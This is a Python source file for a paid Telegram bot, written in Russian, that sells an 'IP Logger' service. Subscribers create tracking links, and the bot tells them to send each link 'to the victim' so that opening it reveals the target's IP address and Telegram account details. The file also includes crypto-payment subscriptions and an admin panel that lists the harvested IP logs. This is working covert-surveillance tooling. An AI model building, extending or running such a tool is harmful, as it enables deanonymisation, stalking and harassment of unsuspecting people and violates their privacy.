import asyncio
import uuid
import logging
import os
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup

from config import BOT_TOKEN, WEBAPP_URL, SUBSCRIPTION_PRICES
from database import Database
from crypto_bot import CryptoBot
from keyboards import (
    get_main_menu, get_subscription_menu, get_logger_actions,
    get_back_to_main, get_confirm_delete
)

# Имя логгер-бота из окружения (для формирования ссылки)
LOGGER_BOT_USERNAME = os.getenv('LOGGER_BOT_USERNAME', 'LoggerBot')

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize bot and dispatcher
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Initialize database and crypto bot
db = Database('database.db')
crypto_bot = CryptoBot(os.getenv('CRYPTO_BOT_TOKEN'))  # Replace with actual token

# FSM states
class LoggerStates(StatesGroup):
    waiting_for_name = State()

async def get_bot_username():
    me = await bot.me()
    return me.username

# Command handlers
@dp.message(Command("start"))
async def cmd_start(message: types.Message, command: Command):
    args = command.args
    if args:
        unique_id = args
        webapp_url = f"{WEBAPP_URL}/logger/{unique_id}"
        kb = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="Открыть логгер", web_app=WebAppInfo(url=webapp_url))]
            ]
        )
        await message.answer(
            "Нажмите кнопку ниже, чтобы открыть страницу.",
            reply_markup=kb
        )
        return
    """Handle /start command"""
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    
    # Create user if doesn't exist
    await db.create_user(user_id, username or "", first_name or "")
    
    welcome_text = f"""
🎉 Добро пожаловать в IP Logger Bot!

Создавайте уникальные ссылки для сбора IP адресов и информации о пользователях.

🔗 **Логгеры** - создание новых логгеров
👤 **Профиль** - информация о вашем аккаунте  
💎 **Купить подписку** - расширенные возможности
📊 **Мои логгеры** - управление существующими логгерами

Выберите действие:
"""
    
    await message.answer(welcome_text, reply_markup=get_main_menu())

# Main menu handlers
@dp.message(F.text == "🔗 Логгеры")
async def handle_loggers(message: types.Message):
    """Handle loggers menu"""
    user_id = message.from_user.id
    user = await db.get_user(user_id)
    
    if not user:
        await message.answer("❌ Ошибка получения данных пользователя")
        return
    
    # Check subscription status
    subscription_active = False
    if user['subscription_expires']:
        expires = datetime.fromisoformat(user['subscription_expires'])
        subscription_active = expires > datetime.now()
    
    limit = 10 if subscription_active and user['subscription_type'] != 'free' else 3
    current_count = len([l for l in await db.get_user_loggers(user_id) if l['is_active']])
    
    text = f"""
🔗 **Создание логгера**

📊 Ваши лимиты:
• Создано логгеров: {current_count}/{limit}
• Тип подписки: {user['subscription_type'].title()}
• Статус: {'✅ Активна' if subscription_active else '❌ Неактивна'}

Для создания нового логгера нажмите кнопку ниже:
"""
    
    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="➕ Создать логгер", callback_data="create_logger")
    keyboard.button(text="🔙 Назад", callback_data="back_to_main")
    keyboard.adjust(1)
    
    await message.answer(text, reply_markup=keyboard.as_markup())

@dp.message(F.text == "👤 Профиль")
async def handle_profile(message: types.Message):
    """Handle profile menu"""
    user_id = message.from_user.id
    user = await db.get_user(user_id)
    
    if not user:
        await message.answer("❌ Ошибка получения данных пользователя")
        return
    
    # Format subscription info
    subscription_info = "❌ Нет активной подписки"
    if user['subscription_expires']:
        expires = datetime.fromisoformat(user['subscription_expires'])
        if expires > datetime.now():
            subscription_info = f"✅ {user['subscription_type'].title()} до {expires.strftime('%d.%m.%Y %H:%M')}"
    
    # Get logger count
    loggers = await db.get_user_loggers(user_id)
    active_loggers = len([l for l in loggers if l['is_active']])
    
    text = f"""
👤 **Ваш профиль**

🆔 ID: `{user['user_id']}`
👤 Имя: {user['first_name']}
🔗 Username: @{user['username'] if user['username'] else 'Не указан'}
💎 Подписка: {subscription_info}
📊 Создано логгеров: {active_loggers}
📅 Дата регистрации: {datetime.fromisoformat(user['created_at']).strftime('%d.%m.%Y')}
"""
    
    await message.answer(text, reply_markup=get_back_to_main(), parse_mode="Markdown")

@dp.message(F.text == "💎 Купить подписку")
async def handle_subscription(message: types.Message):
    """Handle subscription menu"""
    text = """
💎 **Выберите план подписки**

📅 **Неделя** - $3
• До 10 активных логгеров
• Расширенная статистика
• Приоритетная поддержка

📅 **Месяц** - $4  
• До 10 активных логгеров
• Расширенная статистика
• Приоритетная поддержка
• Скидка 25%

♾️ **Навсегда** - $6
• До 10 активных логгеров
• Расширенная статистика
• Приоритетная поддержка
• Пожизненный доступ
• Максимальная скидка
"""
    
    await message.answer(text, reply_markup=get_subscription_menu())

@dp.message(F.text == "📊 Мои логгеры")
async def handle_my_loggers(message: types.Message):
    """Handle my loggers menu"""
    user_id = message.from_user.id
    loggers = await db.get_user_loggers(user_id)
    active_loggers = [l for l in loggers if l['is_active']]
    
    if not active_loggers:
        await message.answer("📭 У вас пока нет активных логгеров", reply_markup=get_back_to_main())
        return
    
    text = "📊 **Ваши логгеры:**\n\n"
    
    for logger in active_loggers:
        created_date = datetime.fromisoformat(logger['created_at']).strftime('%d.%m.%Y')
        text += f"""
🔗 **{logger['name']}**
🆔 ID: `{logger['unique_id']}`
📅 Создан: {created_date}
🌐 Ссылка: `{WEBAPP_URL}/logger/{logger['unique_id']}`
"""
    
    text += "\nВыберите логгер для управления:"
    
    # Create inline keyboard with logger buttons
    keyboard = InlineKeyboardBuilder()
    for logger in active_loggers:
        keyboard.button(
            text=f"🔗 {logger['name']}",
            callback_data=f"manage_{logger['id']}"
        )
    
    keyboard.button(text="🔙 Назад", callback_data="back_to_main")
    keyboard.adjust(1)
    
    await message.answer(text, reply_markup=keyboard.as_markup(), parse_mode="Markdown")

# Callback handlers
@dp.callback_query(F.data == "create_logger")
async def create_logger_callback(callback: types.CallbackQuery, state: FSMContext):
    """Handle create logger button"""
    user_id = callback.from_user.id
    user = await db.get_user(user_id)
    
    if not user:
        await callback.answer("❌ Ошибка получения данных пользователя")
        return
    
    # Check limits
    subscription_active = False
    if user['subscription_expires']:
        expires = datetime.fromisoformat(user['subscription_expires'])
        subscription_active = expires > datetime.now()
    
    limit = 10 if subscription_active and user['subscription_type'] != 'free' else 3
    current_count = len([l for l in await db.get_user_loggers(user_id) if l['is_active']])
    
    if current_count >= limit:
        await callback.answer(f"❌ Достигнут лимит логгеров ({limit})")
        return
    
    await state.set_state(LoggerStates.waiting_for_name)
    await callback.message.edit_text(
        "Введите название для вашего логгера:",
        reply_markup=get_back_to_main()
    )

@dp.message(LoggerStates.waiting_for_name)
async def process_logger_name(message: types.Message, state: FSMContext):
    """Process logger name input"""
    user_id = message.from_user.id
    name = message.text.strip()
    
    if len(name) > 50:
        await message.answer("❌ Название слишком длинное (максимум 50 символов)")
        return
    
    # Generate unique ID
    unique_id = str(uuid.uuid4())[:8]
    
    # Create logger
    success = await db.create_logger(user_id, unique_id, name)
    
    if success:
        bot_username = await get_bot_username()
        link = f"https://t.me/{LOGGER_BOT_USERNAME}?start={unique_id}"
        text = f"""
✅ **Логгер успешно создан!**

🔗 **Название:** {name}
🆔 **Уникальный ID:** `{unique_id}`
🌐 **Ссылка:** `{link}`

📱 Отправьте эту ссылку жертве. Когда она откроет её, вы получите её IP адрес и информацию о Telegram аккаунте.
"""
        
        await message.answer(text, reply_markup=get_back_to_main(), parse_mode="Markdown")
    else:
        await message.answer("❌ Ошибка создания логгера. Попробуйте позже.")
    
    await state.clear()

@dp.callback_query(F.data.startswith("manage_"))
async def manage_logger_callback(callback: types.CallbackQuery):
    """Handle logger management"""
    logger_id = int(callback.data.split("_")[1])
    await callback.message.edit_text(
        "Выберите действие для логгера:",
        reply_markup=get_logger_actions(logger_id)
    )

@dp.callback_query(F.data.startswith("stats_"))
async def show_logger_stats(callback: types.CallbackQuery):
    """Show logger statistics"""
    logger_id = int(callback.data.split("_")[1])
    stats = await db.get_logger_stats(logger_id)
    
    text = f"""
📊 **Статистика логгера**

📈 Всего логов: {stats['total_logs']}

🔄 **Последние логи:**
"""
    
    if stats['recent_logs']:
        for log in stats['recent_logs'][:5]:
            created = datetime.fromisoformat(log['created_at']).strftime('%d.%m %H:%M')
            username = log['telegram_username'] or 'Не указан'
            text += f"• {log['ip_address']} (@{username}) - {created}\n"
    else:
        text += "Пока нет логов"
    
    await callback.message.edit_text(text, reply_markup=get_back_to_main())

@dp.callback_query(F.data.startswith("delete_"))
async def delete_logger_callback(callback: types.CallbackQuery):
    """Handle delete logger"""
    logger_id = int(callback.data.split("_")[1])
    await callback.message.edit_text(
        "⚠️ Вы уверены, что хотите удалить этот логгер?",
        reply_markup=get_confirm_delete(logger_id)
    )

@dp.callback_query(F.data.startswith("confirm_delete_"))
async def confirm_delete_logger(callback: types.CallbackQuery):
    logger_id = int(callback.data.split("_")[2])
    user_id = callback.from_user.id
    # Получаем владельца логгера
    def get_logger_owner():
        import sqlite3
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM loggers WHERE id = ?', (logger_id,))
        row = cursor.fetchone()
        conn.close()
        return row[0] if row else None
    owner_id = get_logger_owner()
    # Проверяем права
    if user_id != owner_id and not await is_admin(user_id):
        await callback.answer("⛔️ Нет доступа к удалению", show_alert=True)
        return
    success = await db.delete_logger(logger_id, owner_id)
    if success:
        await callback.message.edit_text(
            "✅ Логгер успешно удален!",
            reply_markup=get_back_to_main()
        )
    else:
        await callback.message.edit_text(
            "❌ Ошибка удаления логгера",
            reply_markup=get_back_to_main()
        )

@dp.callback_query(F.data.startswith("sub_"))
async def handle_subscription_payment(callback: types.CallbackQuery):
    """Handle subscription payment"""
    subscription_type = callback.data.split("_")[1]
    
    if subscription_type not in SUBSCRIPTION_PRICES:
        await callback.answer("❌ Неверный тип подписки")
        return
    
    price = SUBSCRIPTION_PRICES[subscription_type]
    
    # Create payment invoice
    invoice = await crypto_bot.create_invoice(
        amount=price,
        asset="USDT",
        description=f"Подписка {subscription_type} - IP Logger Bot"
    )
    
    if invoice:
        text = f"""
💳 **Оплата подписки {subscription_type.title()}**

💰 Сумма: ${price}
🔗 Ссылка для оплаты: {invoice.get('pay_url', 'Недоступно')}

⚠️ После оплаты нажмите кнопку "Проверить оплату"
"""
        
        keyboard = InlineKeyboardBuilder()
        keyboard.button(text="✅ Проверить оплату", callback_data=f"check_payment_{invoice['invoice_id']}_{subscription_type}")
        keyboard.button(text="🔙 Назад", callback_data="back_to_main")
        keyboard.adjust(1)
        
        await callback.message.edit_text(text, reply_markup=keyboard.as_markup())
    else:
        await callback.message.edit_text(
            "❌ Ошибка создания платежа. Попробуйте позже.",
            reply_markup=get_back_to_main()
        )

@dp.callback_query(F.data.startswith("check_payment_"))
async def check_payment_status(callback: types.CallbackQuery):
    """Check payment status"""
    parts = callback.data.split("_")
    invoice_id = parts[2]
    subscription_type = parts[3]
    
    status = await crypto_bot.get_invoice_status(invoice_id)
    
    if status == "paid":
        user_id = callback.from_user.id
        
        # Update subscription
        duration_map = {
            'week': 7,
            'month': 30,
            'forever': 36500
        }
        
        await db.update_subscription(user_id, subscription_type, duration_map[subscription_type])
        
        await callback.message.edit_text(
            "✅ Оплата прошла успешно! Ваша подписка активирована.",
            reply_markup=get_back_to_main()
        )
    elif status == "pending":
        await callback.answer("⏳ Оплата еще не прошла. Попробуйте позже.")
    else:
        await callback.answer("❌ Оплата не найдена или отменена.")

@dp.callback_query(F.data == "back_to_main")
async def back_to_main_callback(callback: types.CallbackQuery):
    """Back to main menu"""
    await callback.message.delete()
    await callback.message.answer(
        "Выберите действие:",
        reply_markup=get_main_menu()
    )

@dp.callback_query(F.data == "back_to_loggers")
async def back_to_loggers_callback(callback: types.CallbackQuery):
    """Back to loggers menu"""
    await callback.message.delete()
    await handle_loggers(callback.message)

async def is_admin(user_id: int) -> bool:
    admin_ids = await db.get_admin_ids()
    return user_id in admin_ids

@dp.message(Command("addadmin"))
async def add_admin_cmd(message: types.Message):
    if not await is_admin(message.from_user.id):
        await message.answer("⛔️ Нет доступа")
        return
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        await message.answer("Используй: /addadmin <user_id>")
        return
    new_admin_id = int(args[1])
    await db.add_admin(new_admin_id)
    await message.answer(f"✅ Пользователь {new_admin_id} теперь админ.")

@dp.message(Command("removeadmin"))
async def remove_admin_cmd(message: types.Message):
    if not await is_admin(message.from_user.id):
        await message.answer("⛔️ Нет доступа")
        return
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        await message.answer("Используй: /removeadmin <user_id>")
        return
    del_admin_id = int(args[1])
    await db.remove_admin(del_admin_id)
    await message.answer(f"❌ Пользователь {del_admin_id} больше не админ.")

@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if not await is_admin(message.from_user.id):
        await message.answer("⛔️ Нет доступа")
        return
    # Статистика
    users = await db.get_all_users()
    loggers = await db.get_all_loggers()
    iplogs = await db.get_all_iplogs()
    text = f"""
<b>Админ-панель</b>

👤 Пользователей: {len(users)}
🔗 Логгеров: {len(loggers)}
🌐 IP-логов: {len(iplogs)}

Выберите действие:
"""
    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="👤 Пользователи", callback_data="admin_users")
    keyboard.button(text="🔗 Логгеры", callback_data="admin_loggers")
    keyboard.button(text="🌐 IP-логи", callback_data="admin_iplogs")
    keyboard.button(text="🔙 Главное меню", callback_data="back_to_main")
    keyboard.adjust(1)
    await message.answer(text, reply_markup=keyboard.as_markup(), parse_mode="HTML")

@dp.callback_query(F.data == "admin_users")
async def admin_users_callback(callback: types.CallbackQuery):
    if not await is_admin(callback.from_user.id):
        await callback.answer("⛔️ Нет доступа")
        return
    users = await db.get_all_users()
    text = "<b>Пользователи:</b>\n\n"
    for u in users[:20]:
        text += f"ID: <code>{u[0]}</code> | @{u[1] or '-'} | {u[2]} | {u[3]} | {u[4] or '-'}\n"
    text += f"\nПоказано {min(len(users), 20)} из {len(users)}."
    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="🔙 Назад", callback_data="admin_back")
    await callback.message.edit_text(text, reply_markup=keyboard.as_markup(), parse_mode="HTML")

@dp.callback_query(F.data == "admin_loggers")
async def admin_loggers_callback(callback: types.CallbackQuery):
    if not await is_admin(callback.from_user.id):
        await callback.answer("⛔️ Нет доступа")
        return
    loggers = await db.get_all_loggers()
    text = "<b>Логгеры:</b>\n\n"
    for l in loggers[:20]:
        text += f"ID: <code>{l[0]}</code> | User: <code>{l[1]}</code> | {l[3]} | Активен: {'✅' if l[5] else '❌'}\n"
    text += f"\nПоказано {min(len(loggers), 20)} из {len(loggers)}."
    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="🔙 Назад", callback_data="admin_back")
    await callback.message.edit_text(text, reply_markup=keyboard.as_markup(), parse_mode="HTML")

@dp.callback_query(F.data == "admin_iplogs")
async def admin_iplogs_callback(callback: types.CallbackQuery):
    if not await is_admin(callback.from_user.id):
        await callback.answer("⛔️ Нет доступа")
        return
    iplogs = await db.get_all_iplogs()
    text = "<b>IP-логи:</b>\n\n"
    for ip in iplogs[:20]:
        text += f"ID: <code>{ip[0]}</code> | Logger: <code>{ip[1]}</code> | IP: {ip[2]} | TG: {ip[4] or '-'} | {ip[6][:16]}\n"
    text += f"\nПоказано {min(len(iplogs), 20)} из {len(iplogs)}."
    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="🔙 Назад", callback_data="admin_back")
    await callback.message.edit_text(text, reply_markup=keyboard.as_markup(), parse_mode="HTML")

@dp.callback_query(F.data == "admin_back")
async def admin_back_callback(callback: types.CallbackQuery):
    if not await is_admin(callback.from_user.id):
        await callback.answer("⛔️ Нет доступа", show_alert=True)
        return
    # Возврат к главному меню админ-панели
    users = await db.get_all_users()
    loggers = await db.get_all_loggers()
    iplogs = await db.get_all_iplogs()
    text = f"""
<b>Админ-панель</b>

👤 Пользователей: {len(users)}
🔗 Логгеров: {len(loggers)}
🌐 IP-логов: {len(iplogs)}

Выберите действие:
"""
    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="👤 Пользователи", callback_data="admin_users")
    keyboard.button(text="🔗 Логгеры", callback_data="admin_loggers")
    keyboard.button(text="🌐 IP-логи", callback_data="admin_iplogs")
    keyboard.button(text="🔙 Главное меню", callback_data="back_to_main")
    keyboard.adjust(1)
    await callback.message.edit_text(text, reply_markup=keyboard.as_markup(), parse_mode="HTML")

@dp.message(Command("grant_sub"))
async def grant_subscription_cmd(message: types.Message):
    if not await is_admin(message.from_user.id):
        await message.answer("⛔️ Нет доступа")
        return
    parts = message.text.strip().split()
    if len(parts) != 3 or not parts[1].isdigit():
        await message.answer("Используй: /grant_sub <user_id> <week|month|forever>")
        return
    target_user_id = int(parts[1])
    sub_type = parts[2].lower()
    if sub_type not in {"week", "month", "forever"}:
        await message.answer("Тип должен быть: week, month или forever")
        return
    # Проверим, что пользователь существует
    user = await db.get_user(target_user_id)
    if not user:
        await message.answer("❌ Пользователь не найден в базе")
        return
    days_map = {"week": 7, "month": 30, "forever": 36500}
    await db.update_subscription(target_user_id, sub_type, days_map[sub_type])
    await message.answer(f"✅ Подписка {sub_type} выдана пользователю {target_user_id}")

@dp.message(Command("grant_admin"))
async def grant_admin_cmd(message: types.Message):
    if not await is_admin(message.from_user.id):
        await message.answer("⛔️ Нет доступа")
        return
    parts = message.text.strip().split()
    if len(parts) != 2 or not parts[1].isdigit():
        await message.answer("Используй: /grant_admin <user_id>")
        return
    target_id = int(parts[1])
    await db.add_admin(target_id)
    await message.answer(f"✅ Пользователь {target_id} назначен админом")

@dp.message(Command("revoke_admin"))
async def revoke_admin_cmd(message: types.Message):
    if not await is_admin(message.from_user.id):
        await message.answer("⛔️ Нет доступа")
        return
    parts = message.text.strip().split()
    if len(parts) != 2 or not parts[1].isdigit():
        await message.answer("Используй: /revoke_admin <user_id>")
        return
    target_id = int(parts[1])
    await db.remove_admin(target_id)
    await message.answer(f"❌ Пользователь {target_id} лишён прав админа")

@dp.message(Command("revoke_sub"))
async def revoke_subscription_cmd(message: types.Message):
    if not await is_admin(message.from_user.id):
        await message.answer("⛔️ Нет доступа")
        return
    parts = message.text.strip().split()
    if len(parts) != 2 or not parts[1].isdigit():
        await message.answer("Используй: /revoke_sub <user_id>")
        return
    target_user_id = int(parts[1])
    user = await db.get_user(target_user_id)
    if not user:
        await message.answer("❌ Пользователь не найден в базе")
        return
    await db.revoke_subscription(target_user_id)
    await message.answer(f"❌ Подписка снята с пользователя {target_user_id}")

# Error handler
@dp.errors()
async def errors_handler(update: types.Update, exception: Exception):
    """Handle errors"""
    logger.error(f"Exception while handling {update}: {exception}")

# Main function
async def main():
    """Main function"""
    logger.info("Starting bot...")
    
    try:
        await dp.start_polling(bot)
    except KeyboardInterrupt:
        logger.info("Bot stopped")
    finally:
        await bot.session.close()

if __name__ == "__main__":
    asyncio.run(main())
